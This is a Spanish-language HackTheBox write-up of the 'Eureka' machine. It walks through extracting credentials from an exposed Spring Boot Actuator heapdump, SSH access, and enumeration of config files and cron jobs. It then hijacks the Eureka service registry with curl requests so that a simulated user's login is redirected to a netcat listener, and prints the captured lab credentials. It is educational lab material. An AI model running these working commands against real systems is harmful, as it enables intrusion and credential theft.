---
title: Eureka - Hard (HTB)
permalink: /Eureka-HTB-Writeup/
tags:
  - "Linux"
  - "Hard"
  - "Spring Boot"
  - "Exposed Actuator"
  - "Heapdump"
  - "JDumpSpider"
  - "Credentials Leakage"
  - "pspy"
  - "Eureka Server"
  - "Bash eq"  
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Eureka - Hard (HTB)
seo_description: Abusa de configuraciones inseguras en Spring Boot y Eureka Server para vencer Eureka.
excerpt: Abusa de configuraciones inseguras en Spring Boot y Eureka Server para vencer Eureka.
header:
  overlay_image: /assets/images/headers/eureka-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/eureka-hackthebox.jpg
---


![image-center](/assets/images/posts/eureka-hackthebox.png)
{: .align-center}

**Habilidades:** Abusing Spring Boot Exposed `Actuator` (`heapdump` Endpoint) , Credentials Leakage, Processes Monitoring with `pspy`, Eureka Server Exploitation - Traffic Hijacking, Command Injection - Bash `eq` Comparison [Privilege Escalation]
{: .notice--primary}

# Introducción

Eureka es una máquina Linux de dificultad `Hard` en HackTheBox que requiere aprovechar configuraciones inseguras en un servicio `Sprint Boot` para obtener acceso inicial. Una vez dentro de la máquina, explotaremos el servicio Eureka Server manipulando micro servicios `Spring` y un script de  `bash` para obtener acceso privilegiado.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.66
PING 10.10.11.66 (10.10.11.66) 56(84) bytes of data.
64 bytes from 10.10.11.66: icmp_seq=1 ttl=63 time=162 ms

--- 10.10.11.66 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 161.501/161.501/161.501/0.000 ms
~~~


## Nmap Scanning 

Comenzaremos realizando un escaneo que nos permita identificar puertos abiertos en la máquina víctima

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.66 -oG openPorts

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-30 10:36 EDT
Nmap scan report for 10.10.11.66
Host is up (0.23s latency).
Not shown: 58599 closed tcp ports (reset), 6933 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8761/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 19.75 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo a los puertos que hemos descubierto con el propósito de identificar la versión de los servicios que se ejecutan

~~~ bash
nmap -p 22,80,8761 -sVC 10.10.11.66 -oN services 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-30 10:45 EDT
Nmap scan report for 10.10.11.66
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
8761/tcp open  unknown
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 401 
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Set-Cookie: JSESSIONID=F0DCF5DC69252511EF287AF48BF13E86; Path=/; HttpOnly
|     WWW-Authenticate: Basic realm="Realm"
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 0
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: DENY
|     Content-Length: 0
|     Date: Sat, 30 Aug 2025 14:45:55 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 401 
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Set-Cookie: JSESSIONID=DCFD92F4964C3F9CF8A2EB5358641A89; Path=/; HttpOnly
|     WWW-Authenticate: Basic realm="Realm"
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 0
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: DENY
|     Content-Length: 0
|     Date: Sat, 30 Aug 2025 14:45:55 GMT
|     Connection: close
|   RPCCheck, RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sat, 30 Aug 2025 14:45:55 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8761-TCP:V=7.94SVN%I=7%D=8/30%Time=68B30EA7%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,1D1,"HTTP/1\.1\x20401\x20\r\nVary:\x20Origin\r\nVary:\x20Ac
SF:cess-Control-Request-Method\r\nVary:\x20Access-Control-Request-Headers\
SF:r\nSet-Cookie:\x20JSESSIONID=F0DCF5DC69252511EF287AF48BF13E86;\x20Path=
SF:/;\x20HttpOnly\r\nWWW-Authenticate:\x20Basic\x20realm=\"Realm\"\r\nX-Co
SF:ntent-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x200\r\nCache-Contr
SF:ol:\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nPragm
SF:a:\x20no-cache\r\nExpires:\x200\r\nX-Frame-Options:\x20DENY\r\nContent-
SF:Length:\x200\r\nDate:\x20Sat,\x2030\x20Aug\x202025\x2014:45:55\x20GMT\r
SF:\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,1D1,"HTTP/1\.1\x20401\x2
SF:0\r\nVary:\x20Origin\r\nVary:\x20Access-Control-Request-Method\r\nVary:
SF:\x20Access-Control-Request-Headers\r\nSet-Cookie:\x20JSESSIONID=DCFD92F
SF:4964C3F9CF8A2EB5358641A89;\x20Path=/;\x20HttpOnly\r\nWWW-Authenticate:\
SF:x20Basic\x20realm=\"Realm\"\r\nX-Content-Type-Options:\x20nosniff\r\nX-
SF:XSS-Protection:\x200\r\nCache-Control:\x20no-cache,\x20no-store,\x20max
SF:-age=0,\x20must-revalidate\r\nPragma:\x20no-cache\r\nExpires:\x200\r\nX
SF:-Frame-Options:\x20DENY\r\nContent-Length:\x200\r\nDate:\x20Sat,\x2030\
SF:x20Aug\x202025\x2014:45:55\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(R
SF:TSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;char
SF:set=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDate:
SF:\x20Sat,\x2030\x20Aug\x202025\x2014:45:55\x20GMT\r\nConnection:\x20clos
SF:e\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20St
SF:atus\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"t
SF:ext/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\
SF:x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font-s
SF:ize:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x
SF:20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;bac
SF:kground-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20Sta
SF:tus\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html>")%r(RPC
SF:Check,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=u
SF:tf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDate:\x20S
SF:at,\x2030\x20Aug\x202025\x2014:45:55\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\
SF:x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/c
SF:ss\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3
SF:,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font-size:2
SF:2px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{fo
SF:nt-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;backgrou
SF:nd-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20Status\x
SF:20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Vemos que el servicio HTTP nos intenta redirigir a `http://furni.htb/`, agregaremos este nombre de dominio a nuestro archivo `/etc/hosts`

~~~ bash
echo "10.10.11.66 furni.htb" | sudo tee -a /etc/hosts

10.10.11.66 furni.htb
~~~


## Web Analysis

Podemos realizar un escaneo a las tecnologías web que el servidor ejecuta para mostrar el contenido

~~~ bash
whatweb http://furni.htb        
                       
http://furni.htb [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.66], Meta-Author[Untree.co], Script, Title[Furni | Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]
~~~

Si navegamos hasta `furni.htb`, veremos la siguiente web que parece ser una tienda de muebles

![image-center](/assets/images/posts/eureka-web.png)
{: .align-center}


## Fuzzing

Intentaremos descubrir rutas posibles con la herramienta `gobuster`

~~~
gobuster dir -u http://furni.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://furni.htb/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 14351]
/contact              (Status: 200) [Size: 10738]
/blog                 (Status: 200) [Size: 13568]
/login                (Status: 200) [Size: 1550]
/register             (Status: 200) [Size: 9028]
/services             (Status: 200) [Size: 14173]
/shop                 (Status: 200) [Size: 12412]
/comment              (Status: 302) [Size: 0] [--> http://furni.htb/login]
/cart                 (Status: 302) [Size: 0] [--> http://furni.htb/login]
/logout               (Status: 200) [Size: 1159]
/checkout             (Status: 302) [Size: 0] [--> http://furni.htb/login]
/error                (Status: 500) [Size: 73]
~~~

Podemos notar un código de estado `500` (`Internal Server Error`) en la ruta `/error`, si navegamos hasta allí veremos la siguiente página

![image-center](/assets/images/posts/eureka-web-2.png)
{: .align-center}

> `Whitelabel Error Page` es una página de error genérica que muestran las aplicaciones Spring Boot cuando se produce una excepción no controlada o cuando no se encuentra un recurso solicitado y no hay configurado ningún mecanismo específico para gestionar el error.
{: .notice--info}
<br>


# Intrusión / Explotación
---
## Spring Boot Exposed `Actuator`

Spring Boot Actuator se utiliza ampliamente para la observabilidad de aplicaciones Java y se encuentra en más del 60 % de los entornos en la nube, pero su exposición puede suponer graves riesgos de seguridad si se configura incorrectamente.

> `Actuator` es un módulo de Spring Boot que proporciona funcionalidades de monitorización y administración para aplicaciones en producción.
{: .notice--info}

Sabiendo que estamos frente a `Sprint Boot`, podemos hacer fuzzing con un diccionario que busque diferentes endpoints de `actuator`

~~~ bash
gobuster dir -u http://furni.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt -t 20

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://furni.htb/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/actuator/caches      (Status: 200) [Size: 20]
/actuator             (Status: 200) [Size: 2129]
/actuator/env/lang    (Status: 200) [Size: 668]
/actuator/env/home    (Status: 200) [Size: 668]
/actuator/env         (Status: 200) [Size: 6307]
/actuator/features    (Status: 200) [Size: 467]
/actuator/env/path    (Status: 200) [Size: 668]
/actuator/health      (Status: 200) [Size: 15]
/actuator/info        (Status: 200) [Size: 2]
/actuator/metrics     (Status: 200) [Size: 3356]
/actuator/refresh     (Status: 405) [Size: 114]
/actuator/scheduledtasks (Status: 200) [Size: 54]
/actuator/sessions    (Status: 400) [Size: 108]
/actuator/mappings    (Status: 200) [Size: 35560]
/actuator/configprops (Status: 200) [Size: 37195]
/actuator/loggers     (Status: 200) [Size: 100521]
/actuator/conditions  (Status: 200) [Size: 184221]
/actuator/beans       (Status: 200) [Size: 202254]
/actuator/threaddump  (Status: 200) [Size: 144076]
Progress: 112 / 113 (99.12%)
[ERROR] context deadline exceeded (Client.Timeout or context cancellation while reading body)
~~~

Si navegamos hasta `/actuator`, podremos ver todos los endpoints disponibles. Podemos seguir la siguiente [guía](https://www.wiz.io/blog/spring-boot-actuator-misconfigurations#common-misconfigurations-in-spring-boot-actuator-15) para verificar configuraciones inseguras, notaremos que tenemos acceso al endpoint `heapdump`

![image-center](/assets/images/posts/eureka-web-3.png)
{: .align-center}

> La memoria `heap` en Java es el área de memoria dinámica dentro de la JVM donde se almacenan los objetos y datos de larga duración creados durante la ejecución del programa.
{: .notice--info}

El endpoint `heapdump` es un volcado de la memoria `heap` de la JVM (Java Virtual Machine) en un momento específico. Cuando se genera un `heapdump`, se guardan todos los objetos que están cargados en la memoria en ese instante.

Analizaremos este archivo en busca de información sensible que pueda estar cargada en la memoria. Primeramente hacer una solicitud a `/heapdump` y descargaremos el archivo

~~~ bash
curl http://furni.htb/actuator/heapdump -O 
~~~


## Credentials Leakage

Podemos analizar este volcado de memoria con herramientas como [`jdumpspider`](https://github.com/whwlsfb/JDumpSpider/releases/download/dev-20250409T071858/JDumpSpider-1.1-SNAPSHOT-full.jar)

~~~ bash
java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump 

===========================================
SpringDataSourceProperties
-------------
password = 0sc@r190_S0l!dP@sswd
driverClassName = com.mysql.cj.jdbc.Driver
url = jdbc:mysql://localhost:3306/Furni_WebApp_DB
username = oscar190
~~~

Una forma alternativa es simplemente usar `strings` y con la herramienta `grep` buscar lo que nos interesa, en este caso contraseñas, donde debemos buscar de la siguiente manera

~~~ bash
strings heapdump | grep -i 'password='

proxyPassword='
{password=0sc@r190_S0l!dP@sswd, user=oscar190}!
update users set email=?,first_name=?,last_name=?,password=? where id=?!
~~~


## Shell as `oscar190`

Con las credenciales que obtuvimos en `heapdump`, podremos iniciar sesión por SSH como el usuario `oscar190`

~~~ bash
ssh oscar190@10.10.11.66                                           

Last login: Sat Aug 30 17:41:00 2025 from 10.10.14.132
oscar190@eureka:~$
~~~


## System Enumeration

Comenzaremos un proceso de enumeración manual del sistema que nos permita elevar detectar vías potenciales de escalada de privilegios

### Users

Comprobaremos el archivo `/etc/passwd` para ver otros usuarios del sistema. Notaremos que existe el usuario `miranda-wise`

~~~ bash
oscar190@eureka:~$ cat /etc/passwd | grep sh$

root:x:0:0:root:/root:/bin/bash
oscar190:x:1000:1001:,,,:/home/oscar190:/bin/bash
miranda-wise:x:1001:1002:,,,:/home/miranda-wise:/bin/bash
~~~

### (Posible) Sudoers Privileges

Una de las técnicas más comunes consiste en enumerar privilegios a nivel de `/etc/sudoers`

~~~ bash
oscar190@eureka:~$ sudo -l
[sudo] password for oscar190: 
Sorry, user oscar190 may not run sudo on localhost.
~~~

### Interesting Files

Vemos archivos en la ruta `/opt`, donde existe un script de `bash` al que tenemos acceso. Sin embargo, lo utilizaremos más adelante

~~~ bash
oscar190@eureka:~$ ls -la /opt
total 24
drwxr-xr-x  4 root root     4096 Mar 20 14:17 .
drwxr-xr-x 19 root root     4096 Apr 22 12:47 ..
drwxrwx---  2 root www-data 4096 Aug  7  2024 heapdump
-rwxrwxr-x  1 root root     4980 Mar 20 14:17 log_analyse.sh
drwxr-x---  2 root root     4096 Apr  9 18:34 scripts

oscar190@eureka:~$ ls -l /opt/scripts/
ls: cannot open directory '/opt/scripts/': Permission denied      
oscar190@eureka:~$ ls -l /opt/heapdump/
ls: cannot open directory '/opt/heapdump/': Permission denied
~~~

### Processes Monitoring

Si listamos los procesos del sistema, podremos ver que se ejecuta java como el usuario `www-data`, y éste aplica configuraciones almacenadas dentro de la ruta `/var/www/web`

~~~ bash
ps -eo command

...
...
...
sudo -b -u www-data java -Xms100m -Xmx200m -XX:+UseG1GC -jar target/Furni-0.0.1-SNAPSHOT.jar --spring.config.location=/var/www/web/user-management-service/src/main/resources/applicatio
java -Xms100m -Xmx200m -XX:+UseG1GC -jar target/Furni-0.0.1-SNAPSHOT.jar --spring.config.location=/var/www/web/user-management-service/src/main/resources/application.properties
sudo -b -u www-data java -Xms100m -Xmx200m -XX:+UseG1GC -jar target/Furni-0.0.1-SNAPSHOT.jar --spring.config.location=/var/www/web/Furni/src/main/resources/application.properties
java -Xms100m -Xmx200m -XX:+UseG1GC -jar target/Furni-0.0.1-SNAPSHOT.jar --spring.config.location=/var/www/web/Furni/src/main/resources/application.properties
sudo -b -u www-data java -Xms100m -Xmx200m -XX:+UseG1GC -jar target/demo-0.0.1-SNAPSHOT.jar --spring.config.location=/var/www/web/cloud-gateway/src/main/resources/application.yaml
java -Xms100m -Xmx200m -XX:+UseG1GC -jar target/demo-0.0.1-SNAPSHOT.jar --spring.config.location=/var/www/web/cloud-gateway/src/main/resources/application.yaml
...
...
...
~~~

Para una inspección más profunda, podemos descargar `pspy` y subirlo a la máquina víctima.

Cuando ejecutemos `pspy`, un unos momentos veremos otros procesos que se acontecen desde tareas `cron`

~~~ bash
./pspy64
...
...
2025/08/30 23:37:01 CMD: UID=0     PID=483155 | /usr/sbin/CRON -f 
2025/08/30 23:37:01 CMD: UID=0     PID=483156 | /usr/sbin/CRON -f 
2025/08/30 23:37:01 CMD: UID=0     PID=483157 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/08/30 23:37:01 CMD: UID=0     PID=483158 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/08/30 23:37:01 CMD: UID=0     PID=483160 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/08/30 23:37:01 CMD: UID=0     PID=483162 | grep -oP (?<=name="_csrf" type="hidden" value=")[^"]+ 
2025/08/30 23:37:01 CMD: UID=0     PID=483161 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/08/30 23:37:01 CMD: UID=0     PID=483165 | grep -oP (?<=Set-Cookie: SESSION=)[^;]+ 
2025/08/30 23:37:01 CMD: UID=0     PID=483164 | 
2025/08/30 23:37:01 CMD: UID=0     PID=483163 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/08/30 23:37:01 CMD: UID=0     PID=483166 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/08/30 23:37:01 CMD: UID=0     PID=483167 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/08/30 23:37:01 CMD: UID=0     PID=483168 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/08/30 23:37:01 CMD: UID=0     PID=483171 | curl http://furni.htb/login   -H Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 -H Accept-Language: en-US,en;q=0.8 -H Cache-Control: max-age=0 -H Connection: keep-alive -H Content-Type: application/x-www-form-urlencoded -H Cookie: SESSION=MmUwYWUyNDItN2E3ZC00ZjQ3LWI1MjYtMDVjMzBiMDhkMTIy -H User-Agent: Mozilla/5.0 (X11; Linux x86_64) --data @/tmp/tmp.dVf0BWtr92 --insecure -i 
~~~

### Configuration Files

 Los procesos en ejecución revelan varios archivos los cuales tenemos permisos de lectura, uno de ellos contiene la configuración de las aplicaciones web

~~~ bash
oscar190@eureka:~$ cat /var/www/web/Furni/src/main/resources/application.properties

spring.application.name=Furni
spring.session.store-type=jdbc
spring.cloud.inetutils.ignoredInterfaces=enp0s.*
spring.cloud.client.hostname=localhost
#Eureka
eureka.client.service-url.defaultZone= http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/
eureka.instance.hostname=localhost
eureka.instance.prefer-ip-address=false
#Mysql
spring.jpa.hibernate.ddl-auto=none
spring.datasource.url=jdbc:mysql://localhost:3306/Furni_WebApp_DB
spring.datasource.username=oscar190
spring.datasource.password=0sc@r190_S0l!dP@sswd
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
spring.jpa.properties.hibernate.format_sql=true
#tomcat
server.address=localhost
server.port=8082
# Enable proxy support
server.forward-headers-strategy=native
#A
management.endpoints.web.exposure.include=*
~~~

Un segundo archivo contiene la configuración de un servicio llamado `Eureka`, donde parece desplegarse con `docker compose`

~~~ bash
oscar190@eureka:~$ cat /var/www/web/Eureka-Server/src/main/resources/application.yaml

spring:
  application:
    name: "Eureka Server"

  security:
    user:
      name: EurekaSrvr
      password: 0scarPWDisTheB3st

server:
  port: 8761
  address: 0.0.0.0

eureka:
  client:
    register-with-eureka: false
    fetch-registry: false
~~~

Además podemos intentar buscar más archivos `.yaml` bajo la ruta `/var/www/web` con el comando `find`

~~~ bash
oscar190@eureka:/var/www/web$ find . -name "*.yaml"
./cloud-gateway/target/classes/application.yaml
./cloud-gateway/src/main/resources/application.yaml
./Eureka-Server/target/classes/application.yaml
./Eureka-Server/src/main/resources/application.yaml
~~~

El siguiente archivo de logs de `cloud-gateway` nos brinda un poco más de información y nos dice por qué puerto se ejecuta el servicio `USER-MANAGEMENT-SERVICE`

~~~ bash
oscar190@eureka:/var/www/web$ cat ./cloud-gateway/src/main/resources/application.yaml

eureka:
  instance:
    hostname: localhost
    prefer-ip-address: false
  client:
    registry-fetch-interval-seconds: 20
    service-url:
      defaultZone: http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/

spring:
  cloud:
    client:
      hostname: localhost
    gateway:
      routes:
        - id: user-management-service
          uri: lb://USER-MANAGEMENT-SERVICE
          predicates:
            - Path=/login,/logout,/register,/process_register
        - id: furni
          uri: lb://FURNI
          predicates:
            - Path=/**

  application:
    name: app-gateway

server:
  port: 8080
  address: 127.0.0.1

management:
  tracing:
    sampling:
      probability: 1

logging:
  level:
    root: INFO
  file:
    name: log/application.log
    path: ./
~~~

### Log Files

Podemos encontrar ciertos archivos de logs desde los cuales deducir cierto comportamiento

~~~ bash
oscar190@eureka:/var/www/web$ find . -name "*.log"
./cloud-gateway/log/application.log
./user-management-service/log/application.log
~~~

Si inspeccionamos los logs de `cloud-gateway` notaremos cómo se realiza una solicitud POST de forma periódica al endpoint `/login`

> Spring Cloud Gateway es un **API Gateway** que actúa como **punto de entrada único** para todas las solicitudes dirigidas a tus microservicios
{: .notice--info}

~~~ bash
oscar190@eureka:~$ tail /var/www/web/cloud-gateway/log/application.log | head -n 5
2025-04-09T11:26:01.553Z  INFO 1234 --- [app-gateway] [reactor-http-epoll-3] c.eureka.gateway.Config.LoggingFilter    : HTTP POST /login - Status: 403
2025-04-09T11:26:01.601Z  INFO 1234 --- [app-gateway] [reactor-http-epoll-4] c.eureka.gateway.Config.LoggingFilter    : HTTP POST /login - Status: 403
2025-04-09T11:26:01.669Z  INFO 1234 --- [app-gateway] [reactor-http-epoll-1] c.eureka.gateway.Config.LoggingFilter    : HTTP POST /login - Status: 403
2025-04-09T11:26:45.458Z  INFO 1234 --- [app-gateway] [AsyncResolver-bootstrap-executor-0] c.n.d.s.r.aws.ConfigClusterResolver      : Resolving eureka endpoints via configuration
2025-04-09T11:27:01.910Z  INFO 1234 --- [app-gateway] [reactor-http-epoll-2] c.eureka.gateway.Config.LoggingFilter    : HTTP POST /login - Status: 302
~~~

Viendo el contenido de los archivos de logs del servicio `user-management-service`, veremos cómo se notifica que el usuario `miranda.wise` se ha autenticado correctamente

~~~ bash
oscar190@eureka:~$ tail /var/www/web/user-management-service/log/application.log | head -n 1
2025-04-09T11:32:01.878Z  INFO 1172 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-1] c.e.Furni.Security.LoginSuccessLogger    : User 'miranda.wise@furni.htb' logged in successfully
~~~

Luego de esta enumeración podemos concluir lo siguiente:

- Existe un servicio de `Eureka` ejecutándose por el puerto `8761`, el cual ahora disponemos de credenciales.
- Se ejecuta `cloud-gateway` por el puerto `8080` de forma local, informando los microservicios `USER-MANAGEMENT-SERVICE` y `furni`.
- El servicio `USER-MANAGEMENT-SERVICE` se ejecuta por el puerto `8081` de forma interna.
- El sistema autentica de forma periódica al usuario `miranda.wise` al servicio `USER-MANAGEMENT-SERVICE`.

> Un Eureka Server es un **servidor de registro de servicios** creado por `Netflix`, y ahora parte del ecosistema de `Spring Cloud`, que permite a los microservicios registrarse y descubrirse mutuamente dentro de un sistema distribuido.
{: .notice--info}


## Eureka Server Exploitation - Traffic Hijacking

Con estas nuevas credenciales podremos autenticarnos en el puerto `8761`, donde se ejecuta el servicio `Eureka`

~~~ bash
curl -u EurekaSrvr:0scarPWDisTheB3st http://10.10.11.66:8761/
~~~

La metodología que seguiremos para abusar de este servicio consistirá en sobreescribir el mircro-servicio `USER-MANAGEMENT-SERVICE`, haciendo referencia a nuestra IP, podemos encontrar detalles de explotación y explicación técnica en el siguiente [artículo](https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka)

![eureka-exploitation](https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka/assets/dist/lg/attack-vector2.png)

Comenzaremos registrando el servicio `USER-MANAGEMENT-SERVICE` para que apunte a nuestra IP

~~~ bash
curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@10.10.11.66:8761/eureka/apps/USER-MANAGEMENT-SERVICE  -H 'Content-Type: application/json' -d '{ 
  "instance": {
    "instanceId": "test",
    "hostName": "10.10.14.132",
    "app": "USER-MANAGEMENT-SERVICE",
    "ipAddr": "10.10.14.132",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "status": "UP",
    "port": {   
      "$": 8081,
      "@enabled": "true"
    },                 
    "dataCenterInfo": {                                                  
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    }
  }
}'
~~~

Eliminaremos el mircro-servicio original para asegurarnos que `USER-MANAGEMENT-SERVICE` realmente apunte hacia nuestro registro

~~~ bash
curl -X DELETE http://EurekaSrvr:0scarPWDisTheB3st@10.10.11.66:8761/eureka/apps/USER-MANAGEMENT-SERVICE/localhost:USER-MANAGEMENT-SERVICE:8081
~~~

Para recibir la solicitud POST, basta con ponerse a la escucha por el puerto que usa el micro servicio `USER-MANAGEMENT-SERVICE`

~~~ bash
nc -lvnp 8081
listening on [any] 8081 ...
~~~

Al cabo de unos momentos, recibiremos la solicitud HTTP a nuestro servicio malicioso, donde el usuario `miranda.wise` se autentica enviando sus credenciales

~~~ bash
connect to [10.10.14.132] from (UNKNOWN) [10.10.11.66] 36078
POST /login HTTP/1.1
X-Real-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1,127.0.0.1
X-Forwarded-Proto: http,http
Content-Length: 168
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=NTM1MTcxYWMtMzI4NC00YmIyLTg2OTAtYTk4ZjA2NDJlZDA3
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Forwarded: proto=http;host=furni.htb;for="127.0.0.1:42974"
X-Forwarded-Port: 80
X-Forwarded-Host: furni.htb
host: 10.10.14.132:8081

username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=2n6AUVgbZReFob8I-cHkPuIdoZBr-U6sq5PHk-tt2TMm7nf-7EzjZ2EpVyaokIk5y-zQDoZ-jPFbwH-BmvWjo9sJvQQQ2xWc
~~~

Basta con decodificar la contraseña con una herramienta de `URL Decode`

~~~ bash
miranda-wise:IL!veT0Be&BeT0L0ve
~~~


